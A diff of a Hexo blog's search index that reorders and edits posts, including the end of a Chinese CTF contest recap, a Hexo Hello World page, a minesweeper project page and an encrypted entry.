-<p>随后的攻击阶段我就躺平了，另外一道pwn开了PIE保护，要动态截取内存地址，我不会。r3帮我写了脚本，按照他思路攻击了一下，然而还是无果。web那边welcomeflask主办方连发的三个提示，r3终于成功抢到了二血。</p>
-<p>之后我们都躺平了，攻击阶段排名又是第八。</p>
-<p>接下来是<strong>惊险刺激</strong>的防御阶段，网站给了我们一个docker，然而我屁都不会用，开始边“坐牢”边听音乐。过了25分钟，平台发起了攻击，霎时间有几个队分数暴涨（从两三千涨到八九千），而我们一个题也没防住，掉到了第十名。然后r3又更加精细地补了补漏洞，到第二轮攻击的时候总算还是防住了一个，得分3700，他娘的又是一个第八名。</p>
-<p>为什么说<strong>惊险刺激</strong>呢，因为防御阶段的规则比较奇葩，只要第一轮防住了，第二轮就可以继续得分。更重要的是，我们攻击阶段的满分是4000，而仅仅50分钟的防御就占了6000分，而且积分方式是计算自己分与最高分的比值再*6000——这意味着最先防住漏洞的选手有着极大的分数优势，甚至可以反杀这两天的比赛——很幸运，那位北大小哥抓住了这个机会，他原本是一名替补选手，结果因为第一轮防御就修了3个洞，最后成为了全场比赛的冠军得主。</p>
-<p>果然，国家是要倡导我们做个白帽，要防不要攻啊！</p>
-<p>最后我们总分排名第四，荣获了本次比赛的二等奖（一等奖1、2名，二等奖3~7名，三等奖8~14名）。我惊奇地发现那名学生代表所在的战队也是一等奖得主——果然在任何行业，都有“巾帼不让须眉”的趋势啊。而之前线上的第一名，却名落孙山，不知道到哪儿去了。</p>
-<p><img src="/2021/10/17/ctf03/2nd.jpg" style="zoom: 25%;"></p>
-<p><img src="/2021/10/17/ctf03/pyable.png" style="zoom: 25%;"></p>
-<p>线上的第一名在线下得了零分；而线下的第一名在线上基本上是垫底进的决赛。而我们组，也大致遵从这个规律——线上越苟，线下越强。这说明了什么呢？</p>
-<p>说明这种比赛平时随便打打，玩一玩就行，不必太过于认真。</p>
-<p>毕竟，学好基础知识才是王道，难道不是吗？</p>
-<p>不说了，最近打算把ctf放一放，冲刺一下四级高分，英语免修它不香吗？</p>
 ]]></content>
       <categories>
-        <category>ctf</category>
+        <category>笔记</category>
       </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>crypto</tag>
-        <tag>pwn</tag>
-        <tag>misc</tag>
-      </tags>
   </entry>
   <entry>
     <title>(转载) 撸羊毛</title>
@@ -446,6 +533,23 @@
       </categories>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2021/07/06/hello-world.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! <del>This is your very first post.</del> Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>test</category>
+      </categories>
+  </entry>
+  <entry>
     <title>猜数游戏</title>
     <url>/2021/08/27/guess.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>又是闲来无事，我扒出了竞赛时自己亲手编写的猜数游戏代码，并未对其进行改良，将网上流行的版本与小学数学结合起来，形成了如下代码。</p>
@@ -466,6 +570,35 @@
 ]]></content>
       <categories>
         <category>OI</category>
+      </categories>
+      <tags>
+        <tag>c++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>游戏项目之简易扫雷</title>
+    <url>/2021/12/28/minesweep.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本项目是程序设计课程中的游戏项目。</p>
+<p>github链接：<a href="https://github.com/junyu33/MineSweep/">https://github.com/junyu33/MineSweep/</a></p>
+<p>欢迎大家提issue和pull request</p>
+<span id="more"></span>
+<h1 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h1><p>1）本项目是一个基于EGE图形库的扫雷游戏。</p>
+<p>2）本项目的功能说明：</p>
+<p>   ①简单、普通、困难、自定义四种模式</p>
+<p>   ②前三种模式的时间排行榜（文件归档）</p>
+<p>   ③快速扫雷与快速插旗</p>
+<p>   ④同时支持鼠标和键盘操作</p>
+<p>   ⑤游戏背景音乐的播放和控制 </p>
+<p>3）本项目的开发环境和工具</p>
+<p>   开发环境：vscode mingw 8.1.0</p>
+<p>   工具：ege20.08</p>
+<h2 id="游戏截图"><a href="#游戏截图" class="headerlink" title="游戏截图"></a>游戏截图</h2><p><a href="https://imgtu.com/i/TnFiAe"><img src="https://s4.ax1x.com/2021/12/20/TnFiAe.png" alt="TnFiAe.png" style="zoom: 67%;"></a></p>
+<h1 id="Changelog"><a href="#Changelog" class="headerlink" title="Changelog"></a>Changelog</h1><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">1</span><span class="selector-class">.0</span></span><br><span class="line">(source code)</span><br><span class="line"><span class="selector-tag">2</span><span class="selector-class">.0</span></span><br><span class="line"><span class="selector-tag">configuration</span> <span class="selector-tag">interface</span> (ok)</span><br><span class="line"><span class="selector-tag">mine-generating</span> <span class="selector-tag">xp-</span>&gt;<span class="selector-tag">win7</span> <span class="selector-tag">mode</span> (ok)</span><br><span class="line"><span class="selector-tag">basic</span> <span class="selector-tag">keyboard</span> <span class="selector-tag">support</span> (ok)</span><br><span class="line"><span class="selector-tag">2</span><span class="selector-class">.1</span></span><br><span class="line"><span class="selector-tag">timing</span> (ok)</span><br><span class="line"><span class="selector-tag">minecnt</span> (ok)</span><br><span class="line"><span class="selector-tag">2</span><span class="selector-class">.2</span></span><br><span class="line"><span class="selector-tag">winning</span> <span class="selector-tag">interface</span> <span class="selector-tag">with</span> <span class="selector-tag">personal</span> <span class="selector-tag">things</span> (ok)</span><br><span class="line"><span class="selector-tag">fast-sweeping</span> <span class="selector-tag">keyboard</span> <span class="selector-tag">support</span> (ok)</span><br><span class="line"><span class="selector-tag">highlight</span> <span class="selector-tag">numbers</span> (ok)</span><br><span class="line"><span class="selector-tag">small</span> <span class="selector-tag">changes</span> <span class="selector-tag">about</span> <span class="selector-tag">lastx</span>,<span class="selector-tag">lasty</span> (ok)</span><br><span class="line"><span class="selector-tag">3</span><span class="selector-class">.0</span></span><br><span class="line"><span class="selector-tag">leaderboard</span> (ok)</span><br><span class="line"><span class="selector-tag">three</span> <span class="selector-tag">modes</span> (ok)</span><br><span class="line"><span class="selector-tag">3</span><span class="selector-class">.1</span></span><br><span class="line"><span class="selector-tag">quit</span> <span class="selector-tag">in</span> <span class="selector-tag">menu</span> (ok)</span><br><span class="line"><span class="selector-tag">add</span> <span class="selector-tag">fast-flaggging</span> (keyboard only) (ok)</span><br><span class="line"><span class="selector-tag">lowlight</span> <span class="selector-tag">blanks</span> (keyboard only) (ok)</span><br><span class="line"><span class="selector-tag">3</span><span class="selector-class">.2</span></span><br><span class="line"><span class="selector-tag">add</span> <span class="selector-tag">colors</span> <span class="selector-tag">to</span> <span class="selector-tag">numbers</span> (ok)</span><br><span class="line"><span class="selector-tag">random</span> <span class="selector-tag">block</span> <span class="selector-tag">to</span> <span class="selector-tag">start</span> (ok)</span><br></pre></td></tr></table></figure>
+<h1 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a>模块划分</h1><p><a href="https://imgtu.com/i/TrfvL9"><img src="https://s4.ax1x.com/2021/12/28/TrfvL9.png" alt="TrfvL9.png"></a></p>
+<h1 id="函数调用关系"><a href="#函数调用关系" class="headerlink" title="函数调用关系"></a>函数调用关系</h1><p><a href="https://imgtu.com/i/TrfzZR"><img src="https://s4.ax1x.com/2021/12/28/TrfzZR.png" alt="TrfzZR.png"></a></p>
+]]></content>
+      <categories>
+        <category>develop</category>
       </categories>
       <tags>
         <tag>c++</tag>
@@ -524,52 +657,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/07/06/hello-world.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! <del>This is your very first post.</del> Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>test</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>游戏项目之简易扫雷</title>
-    <url>/2021/12/28/minesweep.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本项目是程序设计课程中的游戏项目。</p>
-<p>github链接：<a href="https://github.com/junyu33/MineSweep/">https://github.com/junyu33/MineSweep/</a></p>
-<p>欢迎大家提issue和pull request</p>
-<span id="more"></span>
-<h1 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h1><p>1）本项目是一个基于EGE图形库的扫雷游戏。</p>
-<p>2）本项目的功能说明：</p>
-<p>   ①简单、普通、困难、自定义四种模式</p>
-<p>   ②前三种模式的时间排行榜（文件归档）</p>
-<p>   ③快速扫雷与快速插旗</p>
-<p>   ④同时支持鼠标和键盘操作</p>
-<p>   ⑤游戏背景音乐的播放和控制 </p>
-<p>3）本项目的开发环境和工具</p>
-<p>   开发环境：vscode mingw 8.1.0</p>
-<p>   工具：ege20.08</p>
-<h2 id="游戏截图"><a href="#游戏截图" class="headerlink" title="游戏截图"></a>游戏截图</h2><p><a href="https://imgtu.com/i/TnFiAe"><img src="https://s4.ax1x.com/2021/12/20/TnFiAe.png" alt="TnFiAe.png" style="zoom: 67%;"></a></p>
-<h1 id="Changelog"><a href="#Changelog" class="headerlink" title="Changelog"></a>Changelog</h1><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">1</span><span class="selector-class">.0</span></span><br><span class="line">(source code)</span><br><span class="line"><span class="selector-tag">2</span><span class="selector-class">.0</span></span><br><span class="line"><span class="selector-tag">configuration</span> <span class="selector-tag">interface</span> (ok)</span><br><span class="line"><span class="selector-tag">mine-generating</span> <span class="selector-tag">xp-</span>&gt;<span class="selector-tag">win7</span> <span class="selector-tag">mode</span> (ok)</span><br><span class="line"><span class="selector-tag">basic</span> <span class="selector-tag">keyboard</span> <span class="selector-tag">support</span> (ok)</span><br><span class="line"><span class="selector-tag">2</span><span class="selector-class">.1</span></span><br><span class="line"><span class="selector-tag">timing</span> (ok)</span><br><span class="line"><span class="selector-tag">minecnt</span> (ok)</span><br><span class="line"><span class="selector-tag">2</span><span class="selector-class">.2</span></span><br><span class="line"><span class="selector-tag">winning</span> <span class="selector-tag">interface</span> <span class="selector-tag">with</span> <span class="selector-tag">personal</span> <span class="selector-tag">things</span> (ok)</span><br><span class="line"><span class="selector-tag">fast-sweeping</span> <span class="selector-tag">keyboard</span> <span class="selector-tag">support</span> (ok)</span><br><span class="line"><span class="selector-tag">highlight</span> <span class="selector-tag">numbers</span> (ok)</span><br><span class="line"><span class="selector-tag">small</span> <span class="selector-tag">changes</span> <span class="selector-tag">about</span> <span class="selector-tag">lastx</span>,<span class="selector-tag">lasty</span> (ok)</span><br><span class="line"><span class="selector-tag">3</span><span class="selector-class">.0</span></span><br><span class="line"><span class="selector-tag">leaderboard</span> (ok)</span><br><span class="line"><span class="selector-tag">three</span> <span class="selector-tag">modes</span> (ok)</span><br><span class="line"><span class="selector-tag">3</span><span class="selector-class">.1</span></span><br><span class="line"><span class="selector-tag">quit</span> <span class="selector-tag">in</span> <span class="selector-tag">menu</span> (ok)</span><br><span class="line"><span class="selector-tag">add</span> <span class="selector-tag">fast-flaggging</span> (keyboard only) (ok)</span><br><span class="line"><span class="selector-tag">lowlight</span> <span class="selector-tag">blanks</span> (keyboard only) (ok)</span><br><span class="line"><span class="selector-tag">3</span><span class="selector-class">.2</span></span><br><span class="line"><span class="selector-tag">add</span> <span class="selector-tag">colors</span> <span class="selector-tag">to</span> <span class="selector-tag">numbers</span> (ok)</span><br><span class="line"><span class="selector-tag">random</span> <span class="selector-tag">block</span> <span class="selector-tag">to</span> <span class="selector-tag">start</span> (ok)</span><br></pre></td></tr></table></figure>
-<h1 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a>模块划分</h1><p><a href="https://imgtu.com/i/TrfvL9"><img src="https://s4.ax1x.com/2021/12/28/TrfvL9.png" alt="TrfvL9.png"></a></p>
-<h1 id="函数调用关系"><a href="#函数调用关系" class="headerlink" title="函数调用关系"></a>函数调用关系</h1><p><a href="https://imgtu.com/i/TrfzZR"><img src="https://s4.ax1x.com/2021/12/28/TrfzZR.png" alt="TrfzZR.png"></a></p>
-]]></content>
-      <categories>
-        <category>develop</category>
-      </categories>
-      <tags>
-        <tag>c++</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>安全项目第一题解答及思路分析</title>
     <url>/2021/10/29/security01.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="解答（四个key及message）："><a href="#解答（四个key及message）：" class="headerlink" title="解答（四个key及message）："></a>解答（四个key及message）：</h1><p>  <img src="/2021/10/29/security01/1.png">         </p>
@@ -622,8 +709,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>crypto</tag>
         <tag>pwn</tag>
+        <tag>crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -726,8 +813,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>reverse</tag>
         <tag>pwn</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -795,22 +882,6 @@
       </categories>
       <tags>
         <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Xposed——从入门到放弃</title>
-    <url>/2021/08/10/xp.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>换新手机后，经过两天的不屑努力（与50元解bootloader锁的智商税？）我终于让华为的手机成了我的手机。</p>
-<span id="more"></span>
-<p><img src="/2021/08/10/xp/1.png" style="zoom: 33%;"></p>
-<p>目前还没发现有什么特别的用处，等以后<strong>有技术了</strong>再来填坑。</p>
-]]></content>
-      <categories>
-        <category>develop</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>android</tag>
       </tags>
   </entry>
   <entry>
@@ -955,6 +1026,22 @@
       </categories>
   </entry>
   <entry>
+    <title>Xposed——从入门到放弃</title>
+    <url>/2021/08/10/xp.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>换新手机后，经过两天的不屑努力（与50元解bootloader锁的智商税？）我终于让华为的手机成了我的手机。</p>
+<span id="more"></span>
+<p><img src="/2021/08/10/xp/1.png" style="zoom: 33%;"></p>
+<p>目前还没发现有什么特别的用处，等以后<strong>有技术了</strong>再来填坑。</p>
+]]></content>
+      <categories>
+        <category>develop</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>再见，acm</title>
     <url>/2021/12/26/%E5%86%8D%E8%A7%81%E2%80%94%E2%80%94acm.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学校上周末和这周末有两场acm选拔赛，上周末因为自己回家没有参加。于是我在今天打算去试试水，看看自己是不是应该在打ctf的同时，把我一年没管的算法竞赛捡起来。</p>
@@ -1043,7 +1130,7 @@
     <title>碎碎念</title>
     <url>/2038/01/19/%E7%A2%8E%E7%A2%8E%E5%BF%B5.html</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="31a887c498abdbf18c2f1e27740244e2d371915bca2ed8859d42ce7c764e5b66">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec32d5f036c78c189b8c30cd311f0c44bcdf9ddedfd6c66bfdfc2bb4a0a23eb7a62d13e83184952540545ea7150454871ae24d80818cfeeb6aa2471f860b72b98c56bbbd4702503971a324dd6df6dd21507ec37799310b591df3f60c43021e13c24c306c1bd047d188eda2c534bb899685046131a268390326c442e9b92300fba7c5e795cd9656b2583900e08e83af6cdebba87ed3eb840c9a0930d0840b98b55775745e3a51ed3b8799fc0fb35ba9aaa30609febde5b587e16d318882d844c49395260b433fbcad4aa40ee1c13c8c92c12a0892c6c237eecd9219b0e7122d178d381fc417eb0a5589e3cdc7952dd32b28a41e36049c43e319e754e9980639dde30bfb93355680b1c2505a33f169d095d830a4d28c7532be7fca77c07874b91105ab49c4cd4d61a06d17a228640d0d7ffa099150fb87ddbac1de725b6bfebf796451f0fd7ac28cd7c44c9d347963e7201aad7534b0dbf27fc01897faf5768a6b64d80c84ac14486b4e7c5706b2af565de95f5ac16fe41c3600e0fa62941820f1bf5615f78821f2f805e77755c267d22e8839884b0352a118197c583aefe1ac5aea9d7b39ff0a1fa7bc45eca0a3488a838c8559f957de4e3acee2bbb760dc606acf3ea2baeeeab18dcafeeda776b48fce26861b6413a746aec1dcd2e9aa45a4b2131885ecb6342b8bcfd3e55b8458efd91bb46cebeb11b9fa8184977eb4e0e6e1b9f6aac03ef139cd0cf6da6900f414f76286c4dcf1c909d79b212c90b0721ad0846ac574cefba3b6b7ecf0ca48fc6ed75da87a32519e0b83f5cf44fa4c92b62e55ae8a15fc70904f61261e7068a017d12e</script>
+  <script id="hbeData" type="hbeData" data-hmacdigest="e57632a1b2b5efb46a4bd9a7ca222fe1611f445cec50048a996b408a8b66947d">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec32d5f036c78c189b8c30cd311f0c44bcdf9ddedfd6c66bfdfc2bb4a0a23eb7a62d13e83184952540545ea7150454871ae24d80818cfeeb6aa2471f860b72b98c56bbbd4702503971a324dd6df6dd21507ec37799310b591df3f60c43021e13c24c306c1bd047d188eda2c534bb899685046131a268390326c442e9b92300fba7c5e795cd9656b2583900e08e83af6cdebba87ed3eb840c9a0930d0840b98b55775745e3a51ed3b8799fc0fb35ba9aaa30609febde5b587e16d318882d844c49395260b433fbcad4aa40ee1c13c8c92c12a0892c6c237eecd9219b0e7122d178d381fc417eb0a5589e3cdc7952dd32b28a41e36049c43e319e754e9980639dde30bfb93355680b1c2505a33f169d095d830a4d28c7532be7fca77c07874b91105ab49c4cd4d61a06d17a228640d0d7ffa099150fb87ddbac1de725b6bfebf796451f0fd7ac28cd7c44c9d347963e7201aad7534b0dbf27fc01897faf5768a6b64d80c84ac14486b4e7c5706b2af565de95f5ac16fe41c3600e0fa62941820f1bf5615f78821f2f805e77755c267d22e8839884b0352a118197c583aefe1ac5aea9d7b39ff0a1fa7bc45eca0a3488a838c8559f957de4e3acee2bbb760dc606acf3ea2baeeeab18dcafeeda776b48fce26861b6413a746aec1dcd2e9aa45a4b2131885ecb6342b8bcfd3e55b8458efd91bb46cebeb11b9fa8184977eb4e0e6e1b9f6aac03ef139cd0cf6da6900f414f76286c4dcf1c909d79b212c90b0721ad0846ac574cefba3b6b7ecf0ca48fc6ed75da87a32519e0b83f5cf44fa4c92b62e55a6d081c3e2a62962387f3096d1da53e0a68e002b7e8d510a8926a7ffc6e306b2cbaa49aadfd7d778a50238602caa7df4a9c31a6907c29b489053c8c51976c07886f64c61f8f15fa45a588dcf12ef998d402b7702f2b2afc60133d0faa42e3f301099ba94db72e5fcf08609464c402266218ec40293e684ae1ac23561afd04a6f978d14cfac1f2e3ece6f5a3911cbf032</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
@@ -1329,10 +1416,10 @@
       </categories>
       <tags>
         <tag>python</tag>
-        <tag>reverse</tag>
-        <tag>crypto</tag>
         <tag>pwn</tag>
         <tag>misc</tag>
+        <tag>crypto</tag>
+        <tag>reverse</tag>
         <tag>c</tag>
         <tag>web</tag>
       </tags>
